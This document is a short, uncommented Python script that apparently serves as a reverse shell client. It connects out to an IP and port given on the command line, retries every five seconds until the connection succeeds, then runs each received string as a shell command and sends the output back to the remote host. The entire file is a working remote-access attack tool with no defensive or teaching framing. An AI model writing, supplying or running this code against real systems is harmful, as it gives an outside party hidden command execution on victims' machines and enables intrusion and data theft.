import socket
import sys
import time
import subprocess

ip = ""
port = 0


def open_shell(con):
    while True:
        data = con.recv(4096)
        output = subprocess.check_output(f'{data.decode()}', shell=True, stdin=subprocess.PIPE, stderr=subprocess.PIPE)
        con.sendall(output)


def main():
    if len(sys.argv) < 2:
        sys.exit("No Address specified")
    else:
        address = sys.argv[1].split(":")
        if len(address) < 2:
            sys.exit("Incorrect IP:PORT address.")

        ip, port = address[0], int(address[1])

    print("Connecting...")
    while True:
        try:
            con = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            con.connect((ip,port))

            print("Connected!")
            open_shell(con)
        except ConnectionRefusedError:
            print("Could not connect!")
            time.sleep(5)
        else:
            break

main()
